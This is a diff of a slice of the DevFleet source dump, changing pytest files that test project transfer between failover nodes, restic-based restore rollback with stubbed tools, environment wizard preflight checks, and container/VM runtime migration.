@@ -1,975 +1,1045 @@
 # DevFleet source part 101
 
 Full-source UTF-8 byte interval [4650000, 4696500); read in order. This is a contiguous text slice, so a code fence/file may continue across parts.
-Payload SHA-256: 226bd1e645a69861e5241351e5fc4ed7f2cfcef4eac9522986ea1196bfa43d16
+Payload SHA-256: 872eade2a709da0ac4c243f2bdffdfdf0d75b4c33bea19375d6ffd1473f724e2
 
 <!-- BEGIN SOURCE SLICE -->
-e, **kwargs)
+       projects.load_authoritative_project_identity_for_mutation(project)
+    with pytest.raises(ValueError, match="awaits source finalization"):
+        projects.start_project(project.name, override_failover=True)
 
 
-def _signed_in():
-    from fastapi.testclient import TestClient
+def test_receive_transfer_rejects_conflicting_existing_project_before_restore(
+    monkeypatch, tmp_path
+):
+    _, project = _canonical_project(monkeypatch, tmp_path, slug="conflict-project")
+    metadata_path = project / ".devfleet/project.json"
+    metadata = json.loads(metadata_path.read_text())
+    metadata["project_id"] = "ffffffff-ffff-4fff-8fff-ffffffffffff"
+    metadata_path.write_text(json.dumps(metadata), encoding="utf-8")
+    forbidden = lambda *_args, **_kwargs: (_ for _ in ()).throw(
+        AssertionError("conflicting destination reached restore")
+    )
+    monkeypatch.setattr(projects, "_vault_request", forbidden)
 
-    client = TestClient(main.app)
-    login = client.get('/login')
-    login_csrf = re.search(r'name="csrf_token" value="([^"]+)"', login.text).group(1)
-    assert _no_redirect(client, 'post', '/login', data={
-        'username': 'test', 'password': 'test-password', 'next': '/', 'csrf_token': login_csrf,
-    }).status_code == 303
-    index = client.get('/')
-    return client, re.search(r'name="csrf_token" value="([^"]+)"', index.text).group(1)
+    with pytest.raises(ValueError, match="project identity does not match"):
+        projects.receive_transferred_project(
+            project.name,
+            PROJECT_ID,
+            DEPLOYMENT_ID,
+            "devfleet-primary",
+            "devfleet-failover",
+        )
 
 
-def test_vm_readiness_requires_running_and_all_connection_proofs():
-    meta = {
-        'slug': 'demo', 'runtime_isolation': 'vm', 'runtime_provider': 'multipass-host-agent',
-        'lifecycle_status': 'stopped', 'runtime_address': '172.30.9.35', 'ssh_alias': 'devfleet-project-demo',
-        'ssh_host_key_pinned': True, 'ssh_authenticated': True, 'ssh_validation_passed': True,
-        'workspace_provisioned': True,
+def test_receive_transfer_replaces_matching_stopped_destination_transactionally(
+    monkeypatch, tmp_path
+):
+    settings, project = _canonical_project(
+        monkeypatch, tmp_path, slug="replace-project"
+    )
+    settings = replace(settings, quarantine=tmp_path / "quarantine")
+    monkeypatch.setattr(projects, "SETTINGS", settings)
+    monkeypatch.setattr(main, "SETTINGS", settings)
+    (project / "prior-sentinel.txt").write_text("prior", encoding="utf-8")
+    staging = (
+        settings.workspaces
+        / "replace-project-recovered-20260916-123456-deadbeef"
+    )
+    monkeypatch.setattr(
+        projects,
+        "run",
+        lambda args, **_kwargs: subprocess.CompletedProcess(args, 0, "", ""),
+    )
+
+    def restore(*_args, **_kwargs):
+        _restore_transfer_fixture(staging, "replace-project")
+        return {"ok": True, "target": str(staging)}
+
+    monkeypatch.setattr(projects, "_vault_request", restore)
+    result = projects.receive_transferred_project(
+        "replace-project",
+        PROJECT_ID,
+        DEPLOYMENT_ID,
+        "devfleet-primary",
+        "devfleet-failover",
+    )
+
+    prior = Path(result["prior_destination_quarantine"])
+    assert result["state"] == "handoff-pending"
+    assert prior.is_dir() and (prior / "prior-sentinel.txt").read_text() == "prior"
+    assert project.is_dir() and not (project / "prior-sentinel.txt").exists()
+    metadata = json.loads((project / ".devfleet/project.json").read_text())
+    assert metadata["transfer_state"] == "pending-source-finalization"
+    assert projects._transfer_pending_marker_path(project).is_file()
+
+
+def test_receive_transfer_adoption_failure_rolls_back_source_bound_records(
+    monkeypatch, tmp_path
+):
+    settings = replace(
+        projects.SETTINGS,
+        workspaces=tmp_path / "workspaces",
+        runtime_root=tmp_path / "runtime",
+        node_name="devfleet-failover",
+        deployment_id=DEPLOYMENT_ID,
+    )
+    settings.workspaces.mkdir()
+    monkeypatch.setattr(projects, "SETTINGS", settings)
+    monkeypatch.setattr(
+        projects,
+        "run",
+        lambda args, **_kwargs: subprocess.CompletedProcess(args, 0, "", ""),
+    )
+    slug = "rollback-transfer"
+    project = settings.workspaces / slug
+    staging = settings.workspaces / f"{slug}-recovered-20260916-123456-deadbeef"
+
+    def restore(*_args, **_kwargs):
+        _restore_transfer_fixture(staging, slug)
+        return {"ok": True, "target": str(staging)}
+
+    monkeypatch.setattr(projects, "_vault_request", restore)
+    monkeypatch.setattr(
+        projects,
+        "write_ownership_override",
+        lambda *_args, **_kwargs: (_ for _ in ()).throw(
+            RuntimeError("ownership override failed")
+        ),
+    )
+
+    with pytest.raises(RuntimeError, match="ownership override failed"):
+        projects.receive_transferred_project(
+            slug,
+            PROJECT_ID,
+            DEPLOYMENT_ID,
+            "devfleet-primary",
+            "devfleet-failover",
+        )
+
+    assert not project.exists()
+    assert staging.is_dir()
+    metadata = json.loads((staging / ".devfleet/project.json").read_text())
+    lease = json.loads((staging / ".devfleet/ownership-lease.json").read_text())
+    assert metadata["host_id"] == "devfleet-primary"
+    assert lease["active_node"] == "devfleet-primary"
+    assert not projects.ownership_override_path(staging).exists()
+
+
+def test_receive_transfer_api_validates_confirmation_and_queues_exact_task(
+    monkeypatch, tmp_path
+):
+    settings = replace(
+        main.SETTINGS,
+        workspaces=tmp_path / "workspaces",
+        runtime_root=tmp_path / "runtime",
+        node_name="devfleet-failover",
+        deployment_id=DEPLOYMENT_ID,
+    )
+    monkeypatch.setattr(main, "SETTINGS", settings)
+    queued = []
+
+    def submit(*args, **kwargs):
+        queued.append((args, kwargs))
+        return "receive-operation"
+
+    monkeypatch.setattr(main, "submit_operation", submit)
+    payload = {
+        "slug": "received-project",
+        "project_id": PROJECT_ID,
+        "deployment_id": DEPLOYMENT_ID,
+        "source_host_id": "devfleet-primary",
+        "destination_host_id": "devfleet-failover",
+        "confirm_slug": "received-project",
+        "confirm_phrase": "RECEIVE TRANSFER received-project",
     }
-    stopped = workspace_readiness('demo', meta)
-    assert stopped['ready'] is False and 'stopped' in stopped['reason']
-    meta['lifecycle_status'] = 'running'
-    running = workspace_readiness('demo', meta)
-    assert running['ready'] is True and running['status'] == 'ready'
-    meta['ssh_authenticated'] = False
-    assert workspace_readiness('demo', meta)['ready'] is False
+    with TestClient(main.app) as client:
+        rejected = client.post(
+            "/api/transfers/receive",
+            headers={"X-DevFleet-Token": "test-token"},
+            json={**payload, "confirm_phrase": "RECEIVE TRANSFER wrong"},
+        )
+        accepted = client.post(
+            "/api/transfers/receive",
+            headers={"X-DevFleet-Token": "test-token"},
+            json=payload,
+        )
+        activate_rejected = client.post(
+            "/api/transfers/activate",
+            headers={"X-DevFleet-Token": "test-token"},
+            json={**payload, "confirm_phrase": "ACTIVATE TRANSFER wrong"},
+        )
+        activate_accepted = client.post(
+            "/api/transfers/activate",
+            headers={"X-DevFleet-Token": "test-token"},
+            json={
+                **payload,
+                "confirm_phrase": "ACTIVATE TRANSFER received-project",
+            },
+        )
 
-
-def test_project_action_requires_exact_origin_port_and_uses_lifecycle_idempotency(tmp_path, monkeypatch):
-    monkeypatch.setattr(main, 'SETTINGS', replace(main.SETTINGS, workspaces=tmp_path))
-    project = tmp_path / 'demo'
-    (project / '.devfleet').mkdir(parents=True)
-    (project / '.devfleet' / 'project.json').write_text(json.dumps({
-        'schema_version': 3, 'managed_by': 'devfleet', 'project_id': '12345678-1234-1234-1234-123456789abc',
-        'slug': 'demo', 'identity': 'demo', 'runtime_provider': 'multipass-host-agent',
-        'runtime_id': 'devfleet-project-demo', 'host_id': 'devfleet-primary',
-    }), encoding='utf-8')
-    client, csrf = _signed_in()
-    calls = []
-    monkeypatch.setattr(main, 'submit_operation', lambda *args, **kwargs: calls.append(kwargs) or 'start-test-op')
-    response = _no_redirect(client, 'post', '/projects/demo/start', headers={
-        'Host': 'testserver:8787', 'Origin': 'http://testserver:80', 'Sec-Fetch-Site': 'same-origin',
-    }, data={'csrf_token': csrf})
-    assert response.status_code == 403
-    response = _no_redirect(client, 'post', '/projects/demo/start', headers={
-        'Host': 'testserver:8787', 'Origin': 'http://testserver:8787', 'Accept': 'application/json',
-    }, data={'csrf_token': csrf})
-    assert response.status_code == 202
-    assert calls[-1]['idempotency_key'] == 'project-action:demo:start'
-
-
-def test_migrated_vm_host_identity_is_local_without_disabling_failover_guard(tmp_path, monkeypatch):
-    project = tmp_path / 'demo'
-    (project / '.devfleet').mkdir(parents=True)
-    (project / '.devfleet' / 'project.json').write_text(json.dumps({
-        'schema_version': 3, 'managed_by': 'devfleet', 'project_id': '12345678-1234-1234-1234-123456789abc',
-        'slug': 'demo', 'identity': 'demo', 'runtime_provider': 'multipass-host-agent',
-        'runtime_id': 'devfleet-project-demo', 'host_id': 'MULATTOTECHBOX',
-    }), encoding='utf-8')
-    monkeypatch.setattr(main, 'SETTINGS', replace(
-        main.SETTINGS, workspaces=tmp_path, node_name='devfleet-primary',
-        expected_host_name='MULATTOTECHBOX',
-    ))
-    monkeypatch.setattr(main, 'safe_child', lambda _root, _slug: project)
-    monkeypatch.setattr(main, 'peer_status', lambda: (_ for _ in ()).throw(
-        AssertionError('local migrated VM must not require peer reachability'),
-    ))
-    main.require_safe_start('demo', False)
-
-
-def test_spa_action_delegation_and_resource_contracts():
-    root = Path(__file__).resolve().parents[1]
-    js = (root / 'app/static/app.js').read_text(encoding='utf-8')
-    html = (root / 'app/templates/index.html').read_text(encoding='utf-8')
-    assert 'window.__devfleetProjectActionsBound' in js
-    assert 'event.preventDefault();' in js and "'Idempotency-Key'" in js
-    assert 'initializeView();' in js and 'nodeFilter?.addEventListener' in js
-    assert 'resource_allocation(p)' in html and 'Not applicable — VM isolation' in html
-    assert 'Workspace readiness has not been verified' in html
-
-
-def test_vscode_helper_is_scoped_atomic_and_malformed_safe():
-    root = Path(__file__).resolve().parents[1]
-    helper = (root / 'windows/DevFleet-VSCode.ps1').read_text(encoding='utf-8')
-    agent = (root / 'windows/DevFleet-HostAgent.ps1').read_text(encoding='utf-8')
-    installer = (root / 'windows/Install-DevFleet-HostAgent.ps1').read_text(encoding='utf-8')
-    assert 'remote.SSH.remotePlatform' in helper
-    assert 'Copy($Path, $backup, $false)' in helper
-    assert 'Move-Item -LiteralPath $tmp -Destination $Path -Force' in helper
-    assert 'ConvertFrom-DevFleetJsonc' in helper and 'malformed user settings' in helper.lower() and 'replacement is written' in helper.lower()
-    assert 'Sync-DevFleetVsCodeRemotePlatform' in agent and 'VsCodeSettingsPaths' in installer
-    assert '[switch]$SkipFirewall' in installer and 'if (-not $SkipFirewall)' in installer
+    assert rejected.status_code == 400
+    assert accepted.status_code == 202
+    assert activate_rejected.status_code == 400
+    assert activate_accepted.status_code == 202
+    assert len(queued) == 2
+    receive_args, receive_kwargs = queued[0]
+    activate_args, activate_kwargs = queued[1]
+    assert receive_args[:2] == ("receive-transfer", "received-project")
+    assert receive_kwargs["project_id"] == PROJECT_ID
+    assert activate_args[:2] == ("activate-transfer", "received-project")
+    assert activate_kwargs["idempotency_key"].endswith(
+        ":devfleet-primary:devfleet-failover"
+    )
 
 ```
 
 
-## FILE: source/tests/test_v128_container_workspace.py
+## FILE: source/tests/test_v123_vault_restore_transaction.py
 
-SHA256: f947532feee6305c049ffa245545e60dc389ae6507b44552914471ebabbf4ae9 | Bytes: 4527 | Git mode: 100644
+SHA256: d13055a62902cdfe9b0ff6ab24dc8e0e3dab1e3fd79b0a21cda26cc01ee84633 | Bytes: 5814 | Git mode: 100644
+
+```
+from __future__ import annotations
+
+import json
+import os
+from pathlib import Path
+import shutil
+import subprocess
+
+import pytest
+
+
+ROOT = Path(__file__).resolve().parents[1]
+WINDOWS_GIT_BASH = Path(r"C:\Program Files\Git\bin\bash.exe")
+BASH = WINDOWS_GIT_BASH if WINDOWS_GIT_BASH.is_file() else Path(shutil.which("bash") or "")
+
+
+def unix(path: Path) -> str:
+    value = path.resolve().as_posix()
+    return "/" + value[0].lower() + value[2:] if value[1:3] == ":/" else value
+
+
+def executable(path: Path, text: str) -> None:
+    path.write_text(text, encoding="utf-8", newline="\n")
+    path.chmod(0o755)
+
+
+@pytest.mark.parametrize("rollback_collision", [False, True])
+def test_canonical_promotion_failure_preserves_the_prior_workspace(
+    tmp_path: Path, rollback_collision: bool
+):
+    assert BASH.is_file(), "A Bash runtime is required for the shipped restore transaction test."
+    lab = tmp_path / "lab"
+    bin_dir = lab / "bin"
+    workspaces = lab / "workspaces"
+    quarantine = lab / "quarantine"
+    for directory in (bin_dir, workspaces, quarantine, lab / "etc", lab / "run"):
+        directory.mkdir(parents=True)
+    project = "vault-source"
+    project_id = "12345678-1234-1234-1234-123456789abc"
+    canonical = workspaces / project
+    (canonical / ".devfleet").mkdir(parents=True)
+    (canonical / "original.txt").write_text("prior-canonical\n", encoding="utf-8")
+    (canonical / ".devfleet/project.json").write_text(
+        json.dumps(
+            {
+                "schema_version": 5,
+                "managed_by": "devfleet",
+                "slug": project,
+                "project_id": project_id,
+            }
+        ),
+        encoding="utf-8",
+    )
+    (lab / "etc/restic.env").write_text("RESTIC_REPOSITORY=test\n", encoding="utf-8")
+    (lab / "uuid").write_text("deadbeef-1111-2222-3333-444444444444\n", encoding="utf-8")
+
+    script_text = (ROOT / "linux/devfleet-restore-project").read_text(encoding="utf-8")
+    script_text = script_text.replace(
+        "set -Eeuo pipefail",
+        'set -Eeuo pipefail\nPATH="$DEVFLEET_TEST_BIN:/usr/bin:/bin"',
+        1,
+    )
+    for source, replacement in (
+        ("/home/devrunner/.devfleet-quarantine", "${DEVFLEET_TEST_ROOT}/quarantine"),
+        ("/home/devrunner/workspaces", "${DEVFLEET_TEST_ROOT}/workspaces"),
+        ("/etc/devfleet/restic.env", "${DEVFLEET_TEST_ROOT}/etc/restic.env"),
+        ("/run/lock/devfleet-vault-operation.lock", "${DEVFLEET_TEST_ROOT}/run/vault.lock"),
+        ("/proc/sys/kernel/random/uuid", "${DEVFLEET_TEST_ROOT}/uuid"),
+    ):
+        script_text = script_text.replace(source, replacement)
+    script = lab / "restore-under-test"
+    executable(script, script_text)
+
+    executable(bin_dir / "flock", "#!/usr/bin/env bash\nexit 0\n")
+    executable(bin_dir / "python3", "#!/usr/bin/env bash\nexit 0\n")
+    executable(
+        bin_dir / "jq",
+        """#!/usr/bin/env bash
+if [[ "$*" == *"--arg slug"* ]]; then
+  exit 0
+fi
+cat >/dev/null
+printf 'snap-1\\n'
+""",
+    )
+    executable(
+        bin_dir / "restic",
+        """#!/usr/bin/env bash
+if [[ "${1:-}" == snapshots ]]; then
+  printf '[{"id":"snap-1","time":"2026-09-16T00:00:00Z"}]\\n'
+  exit 0
+fi
+target=""
+while [[ $# -gt 0 ]]; do
+  if [[ "$1" == --target ]]; then target=$2; shift 2; continue; fi
+  shift
+done
+source_dir="$target${DEVFLEET_TEST_ROOT}/workspaces/$PROJECT"
+mkdir -p "$source_dir/.devfleet"
+printf '{"schema_version":5,"managed_by":"devfleet","slug":"%s","project_id":"%s"}\\n' "$PROJECT" "$PROJECT_ID" >"$source_dir/.devfleet/project.json"
+printf 'restored-copy\\n' >"$source_dir/restored.txt"
+""",
+    )
+    executable(
+        bin_dir / "mv",
+        """#!/usr/bin/env bash
+counter="$DEVFLEET_TEST_ROOT/mv-count"
+count=0
+[[ -f "$counter" ]] && read -r count <"$counter"
+count=$((count + 1))
+printf '%s\\n' "$count" >"$counter"
+if [[ $count -eq 2 ]]; then
+  exit 42
+fi
+if [[ $count -eq 3 && "${ROLLBACK_COLLISION:-0}" == 1 ]]; then
+  destination="${@: -1}"
+  mkdir -p "$destination"
+  printf 'foreign-race\\n' >"$destination/foreign.txt"
+fi
+exec /usr/bin/mv "$@"
+""",
+    )
+
+    env = os.environ.copy()
+    env.update(
+        {
+            "DEVFLEET_TEST_ROOT": unix(lab),
+            "DEVFLEET_TEST_BIN": unix(bin_dir),
+            "PROJECT": project,
+            "PROJECT_ID": project_id,
+            "ROLLBACK_COLLISION": "1" if rollback_collision else "0",
+            "PATH": f"{unix(bin_dir)}:/usr/bin:/bin",
+        }
+    )
+    result = subprocess.run(
+        [str(BASH), "--noprofile", "--norc", unix(script), project, project_id, "--canonical"],
+        capture_output=True,
+        text=True,
+        env=env,
+        timeout=20,
+        check=False,
+    )
+
+    assert result.returncode != 0
+    quarantined = list(quarantine.glob("transfer-replaced-*"))
+    if rollback_collision:
+        assert result.returncode == 6
+        assert (canonical / "foreign.txt").read_text(encoding="utf-8") == "foreign-race\n"
+        assert len(quarantined) == 1
+        assert (quarantined[0] / "original.txt").read_text(encoding="utf-8") == "prior-canonical\n"
+    else:
+        assert (canonical / "original.txt").read_text(encoding="utf-8") == "prior-canonical\n"
+        assert not (canonical / "restored.txt").exists()
+        assert not quarantined
+
+
+def test_restore_script_binds_snapshot_to_slug_and_project_id():
+    text = (ROOT / "linux/devfleet-restore-project").read_text(encoding="utf-8")
+    assert 'python3 -I /opt/devfleet/devfleet/metadata_io.py' in text
+    assert '--identity "$workspace" "$project" "$expected_project_id"' in text
+    assert '"$expected_deployment_id" "$expected_source_host_id"' in text
+    assert 'workspace_identity_matches "$target"' in text
+    assert "Canonical restore rollback failed" in text
+    assert "rollback did not reach its identity-bound postcondition" in text
+
+```
+
+
+## FILE: source/tests/test_v124_environment_wizard.py
+
+SHA256: cc35cdd574c4a2e12f84169d3b821030eead1bced0d3f1edcc3d09da6d478e0e | Bytes: 3060 | Git mode: 100644
 
 ```
 import json
-from dataclasses import replace
 from pathlib import Path
+
+import pytest
+from fastapi import HTTPException
+
+from devfleet import main
+
+
+def _workspace(tmp_path: Path) -> Path:
+    project = tmp_path / 'demo'
+    (project / '.devfleet').mkdir(parents=True)
+    (project / 'compose.yaml').write_text('services: {}\n', encoding='utf-8')
+    (project / '.devfleet/project.json').write_text(json.dumps({
+        'schema_version': 5,
+        'managed_by': 'devfleet',
+        'slug': 'demo',
+        'identity': 'demo',
+        'project_id': '12345678-1234-1234-1234-123456789abc',
+        'runtime_isolation': 'container',
+        'runtime_provider': 'docker-compose',
+        'runtime_id': 'devfleet-demo',
+        'host_id': 'test-node',
+        'resource_profile': 'standard',
+    }), encoding='utf-8')
+    return project
+
+
+def test_preflight_reports_insufficient_selected_capacity(monkeypatch, tmp_path):
+    project = _workspace(tmp_path)
+    monkeypatch.setattr(main, 'safe_child', lambda *_: project)
+    monkeypatch.setattr(main, 'inspect_workspace', lambda *_: {'safe_for_archive': True})
+    monkeypatch.setattr(main, 'detect_runtime', lambda *_: {'runtime_type': 'container'})
+    monkeypatch.setattr(main, 'get_host_capacity', lambda: {'capacity': {'allocatable_cpus': 8, 'allocatable_memory_gb': 2.5, 'allocatable_disk_gb': 200}})
+    monkeypatch.setattr(main, 'project_command_readiness', lambda *_: {'ready': True, 'missing_required': [], 'invalid_required': {}})
+    result = main._preflight('demo', 'vm', 'large')
+    assert result['inspection_ok'] is True
+    assert result['capacity_ready'] is False
+    assert result['migration_ready'] is False
+    assert result['blockers']
+
+
+def test_preflight_uses_selected_custom_resources(monkeypatch, tmp_path):
+    project = _workspace(tmp_path)
+    monkeypatch.setattr(main, 'safe_child', lambda *_: project)
+    monkeypatch.setattr(main, 'inspect_workspace', lambda *_: {'safe_for_archive': True})
+    monkeypatch.setattr(main, 'detect_runtime', lambda *_: {'runtime_type': 'container'})
+    monkeypatch.setattr(main, 'get_host_capacity', lambda: {'capacity': {'allocatable_cpus': 8, 'allocatable_memory_gb': 16, 'allocatable_disk_gb': 200}})
+    monkeypatch.setattr(main, 'project_command_readiness', lambda *_: {'ready': True, 'missing_required': [], 'invalid_required': {}})
+    result = main._preflight('demo', 'vm', 'custom', '3', '6', '60', 'private', '900')
+    assert result['selected_resource_profile'] == 'custom'
+    assert result['selected_limits']['memory_gb'] == 6
+    assert result['selected_limits']['pids'] == 900
+    assert result['migration_ready'] is True
+
+
+def test_environment_mutation_requires_final_wizard_confirmation(monkeypatch):
+    monkeypatch.setattr(main, 'ui', lambda *_: None)
+    with pytest.raises(HTTPException, match='Complete the Environment'):
+        main.project_environment(object(), 'demo', wizard_confirmed=False, csrf_token='valid')
+
+
+def test_preset_does_not_submit_custom_values():
+    assert main._form_resource_limits('standard', '6', '12', '120', '4096', 'private') is None
+
+```
+
+
+## FILE: source/tests/test_v124_migration_transaction.py
+
+SHA256: 74c240589060a7fe59d71b6a829689c2564bcaa3a5cba00039060d05546b2ae9 | Bytes: 10484 | Git mode: 100644
+
+```
+import json
+
+import pytest
 
 import devfleet.projects as projects
 from devfleet.core import SETTINGS
 
 
-def _project(tmp_path: Path, slug: str, metadata: dict) -> Path:
-    project = tmp_path / slug
-    (project / '.devfleet').mkdir(parents=True)
-    persisted = {
-        'schema_version': 3,
-        'managed_by': 'devfleet',
-        'project_id': '12345678-1234-1234-1234-123456789abc',
-        'slug': slug,
-        'identity': slug,
-        'runtime_provider': 'docker-compose',
-        'runtime_id': 'df_' + slug.replace('-', '_'),
-        'host_id': 'devfleet-primary',
-        **metadata,
+def make_project(slug: str, *, runtime: str, lifecycle: str) -> None:
+    project = SETTINGS.workspaces / slug
+    (project / '.devfleet').mkdir(parents=True, exist_ok=True)
+    (project / 'compose.yaml').write_text('services:\n  app:\n    image: ubuntu:24.04\n', encoding='utf-8')
+    (project / '.devfleet' / 'template.json').write_text(json.dumps({
+        'start_command': 'docker compose up -d --build',
+        'stop_command': 'docker compose down --remove-orphans',
+        'restart_command': 'docker compose restart',
+        'rebuild_command': 'docker compose build && docker compose up -d',
+        'logs_command': 'docker compose logs',
+    }), encoding='utf-8')
+    metadata = {
+        'schema_version': 2, 'managed_by': 'devfleet', 'identity': slug, 'slug': slug, 'project_id': '12345678-1234-1234-1234-123456789abc', 'host_id': SETTINGS.node_name,
+        'runtime_isolation': runtime, 'runtime_type': runtime,
+        'runtime_provider': 'multipass-host-agent' if runtime == 'vm' else 'docker-compose',
+        'runtime_id': f'devfleet-project-{slug}' if runtime == 'vm' else '',
+        'lifecycle_status': lifecycle, 'runtime_status': lifecycle,
+        'resource_profile': 'small',
     }
-    (project / '.devfleet' / 'project.json').write_text(json.dumps(persisted), encoding='utf-8')
-    return project
+    (project / '.devfleet' / 'project.json').write_text(json.dumps(metadata), encoding='utf-8')
 
 
-def test_container_workspace_opens_when_application_containers_are_stopped(monkeypatch, tmp_path):
-    _project(tmp_path, 'container-stopped', {
-        'slug': 'container-stopped',
-        'runtime_isolation': 'container',
-        'runtime_type': 'container',
-        'runtime_provider': 'docker-compose',
-        'lifecycle_status': 'stopped',
-        'runtime_status': 'stopped',
-        'workspace_host': 'devfleet-primary',
-        'ssh_alias': 'devfleet-primary',
-        'workspace_path': '/home/devrunner/workspaces/container-stopped',
-        'workspace_provisioned': True,
-        'workspace_accessible': True,
-    })
-    monkeypatch.setattr(projects, 'SETTINGS', replace(SETTINGS, workspaces=tmp_path, node_name='devfleet-primary'))
-    monkeypatch.setattr(projects, 'running', lambda *_: False)
+@pytest.mark.parametrize(
+    ('source', 'target', 'lifecycle'),
+    [('container', 'vm', 'running'), ('container', 'vm', 'stopped'), ('vm', 'container', 'running'), ('vm', 'container', 'stopped')],
+)
+def test_migration_preserves_each_source_lifecycle(monkeypatch: pytest.MonkeyPatch, source: str, target: str, lifecycle: str):
+    slug = f'v124-{source}-{target}-{lifecycle}'
+    make_project(slug, runtime=source, lifecycle=lifecycle)
+    calls: list[str] = []
+    monkeypatch.setattr(projects, 'running', lambda _project: lifecycle == 'running')
+    monkeypatch.setattr(projects, 'backup_project', lambda _slug: json.dumps({'backup_status': 'verified'}))
+    monkeypatch.setattr(projects, 'get_host_capacity', lambda: {'capacity': {'allocatable_cpus': 8, 'allocatable_memory_gb': 24, 'allocatable_disk_gb': 300}})
+    monkeypatch.setattr(projects, 'sync_project_vm_ssh_alias', lambda *args, **kwargs: {'ok': True})
+    monkeypatch.setattr(projects.VmRuntimeOperations, 'ensure', staticmethod(lambda _slug, _meta: {'runtime_id': f'devfleet-project-{slug}', 'address': '10.0.0.1'}))
+    monkeypatch.setattr(projects.VmRuntimeOperations, 'start', staticmethod(lambda value, _meta: calls.append(f'vm-start:{value}') or {'runtime_id': f'devfleet-project-{value}'}))
+    monkeypatch.setattr(projects.VmRuntimeOperations, 'stop', staticmethod(lambda value, _meta: calls.append(f'vm-stop:{value}') or {'state': 'stopped'}))
+    monkeypatch.setattr(projects, 'import_project_workspace', lambda *args, **kwargs: {'workspace_preserved': True, 'source_archive_sha256': 'a' * 64, 'target_archive_sha256': 'a' * 64})
+    monkeypatch.setattr(projects.VM_RUNTIME, 'export_to_source', lambda *args, **kwargs: {'state': 'verified', 'workspace_path': f'/home/devrunner/workspaces/{slug}', 'previous_workspace_path': f'/home/devrunner/workspaces/{slug}-before-vm-export-0123456789abcdef0123456789abcdef'})
 
-    result = projects.open_workspace('container-stopped')
+    def start(value: str) -> str:
+        calls.append(f'start:{value}')
+        project = SETTINGS.workspaces / value
+        meta = projects.load_meta(project)
+        meta.update({'lifecycle_status': 'running', 'runtime_status': 'running', 'health_status': 'healthy'})
+        projects.atomic_json(projects.metadata_path(project), meta)
+        return 'started'
 
-    assert result['ok'] is True
-    assert result['readiness']['ready'] is True
-    assert result['readiness']['application_running'] is False
-    assert result['ssh_alias'] == 'devfleet-primary'
-    assert 'ssh-remote+devfleet-primary' in result['launcher_uri']
+    monkeypatch.setattr(projects, 'start_project', start)
+    monkeypatch.setattr(projects, 'stop_project', lambda value: calls.append(f'stop:{value}') or 'stopped')
+    monkeypatch.setattr(projects, 'runtime_health', lambda _slug: {'ok': True, 'healthy': True})
+    monkeypatch.setattr(projects, 'health_project', lambda _slug: 'healthy')
 
+    result = projects.assign_project_runtime(slug, target, 'small')
+    saved = projects.load_meta(SETTINGS.workspaces / slug)
 
-def test_container_workspace_blocks_when_primary_workspace_is_unavailable(monkeypatch, tmp_path):
-    _project(tmp_path, 'container-unavailable', {
-        'slug': 'container-unavailable',
-        'runtime_isolation': 'container',
-        'runtime_type': 'container',
-        'lifecycle_status': 'stopped',
-        'workspace_accessible': False,
-    })
-    monkeypatch.setattr(projects, 'SETTINGS', replace(SETTINGS, workspaces=tmp_path, node_name='devfleet-primary'))
-
-    result = projects.open_workspace('container-unavailable')
-
-    assert result['ok'] is False
-    assert 'not accessible' in result['error']
-
-
-def test_starting_dedicated_vm_cannot_open(monkeypatch, tmp_path):
-    _project(tmp_path, 'vm-starting', {
-        'slug': 'vm-starting',
-        'runtime_isolation': 'vm',
-        'runtime_type': 'vm',
-        'runtime_provider': 'multipass-host-agent',
-        'lifecycle_status': 'starting',
-        'runtime_id': 'devfleet-project-vm-starting',
-        'ssh_alias': 'devfleet-project-vm-starting',
-    })
-    monkeypatch.setattr(projects, 'SETTINGS', replace(SETTINGS, workspaces=tmp_path))
-    monkeypatch.setattr(projects.VmRuntimeOperations, 'inspect', staticmethod(lambda *_: {'info': {'state': 'Starting'}}))
-    monkeypatch.setattr(projects.VmRuntimeOperations, 'refresh', staticmethod(lambda *_: (_ for _ in ()).throw(AssertionError('refresh must wait for running state'))))
-
-    result = projects.open_workspace('vm-starting')
-
-    assert result['ok'] is False
-    assert result['state'] == 'starting'
-    assert 'starting' in result['error'].lower()
+    assert saved['lifecycle_status'] == ('running' if lifecycle == 'running' else 'stopped')
+    assert result['application_health'] == ('healthy' if lifecycle == 'running' else 'not-run-stopped')
+    assert any(item.startswith('start:') for item in calls) is (lifecycle == 'running')
+    assert any(item.startswith('vm-start:') for item in calls) is (source == 'vm' and lifecycle == 'stopped')
+    assert any(item.startswith('vm-stop:') for item in calls) is (source == 'container' and target == 'vm' and lifecycle == 'stopped')
+    if source == 'vm' and target == 'container':
+        assert saved['previous_environment']['runtime_id'] == f'devfleet-project-{slug}'
+        assert saved['previous_environment']['previous_workspace_path'].endswith('0123456789abcdef0123456789abcdef')
 
 
-def test_running_ssh_ready_dedicated_vm_opens(monkeypatch, tmp_path):
-    _project(tmp_path, 'vm-ready', {
-        'slug': 'vm-ready',
-        'runtime_isolation': 'vm',
-        'runtime_type': 'vm',
-        'runtime_provider': 'multipass-host-agent',
-        'lifecycle_status': 'running',
-        'runtime_id': 'devfleet-project-vm-ready',
-        'runtime_address': '172.30.9.35',
-        'ssh_alias': 'devfleet-project-vm-ready',
-        'ssh_host_key_pinned': True,
-        'ssh_authenticated': True,
-        'ssh_validation_passed': True,
-        'workspace_provisioned': True,
-    })
-    monkeypatch.setattr(projects, 'SETTINGS', replace(SETTINGS, workspaces=tmp_path))
-    monkeypatch.setattr(projects.VmRuntimeOperations, 'inspect', staticmethod(lambda *_: {'info': {'state': 'Running'}}))
-    monkeypatch.setattr(projects, 'running', lambda *_: True)
+def test_schema2_migration_uses_real_backup_then_enables_strict_runtime_action(
+    monkeypatch: pytest.MonkeyPatch,
+):
+    slug = 'v124-schema2-upgrade'
+    make_project(slug, runtime='container', lifecycle='stopped')
+    monkeypatch.setattr(projects, 'running', lambda _project: False)
+    monkeypatch.setattr(
+        projects,
+        'detect_runtime',
+        lambda _slug: {
+            'runtime_isolation': 'container',
+            'runtime_provider': 'docker-compose',
+        },
+    )
+    monkeypatch.setattr(
+        projects,
+        '_vault_request',
+        lambda action, *args, **kwargs: {
+            'ok': True,
+            'action': action,
+            'local_backup_status': 'verified',
+            'vault_upload_status': 'verified',
+            'durability_level': 'vault',
+        },
+    )
 
-    result = projects.open_workspace('vm-ready')
+    result = projects.assign_project_runtime(slug, 'container', 'small')
+    project = SETTINGS.workspaces / slug
+    saved = json.loads((project / '.devfleet/project.json').read_text(encoding='utf-8'))
+    inspected = projects.inspect_runtime(slug)
 
-    assert result['ok'] is True
-    assert result['readiness']['ready'] is True
-    assert result['ssh_alias'] == 'devfleet-project-vm-ready'
-
-```
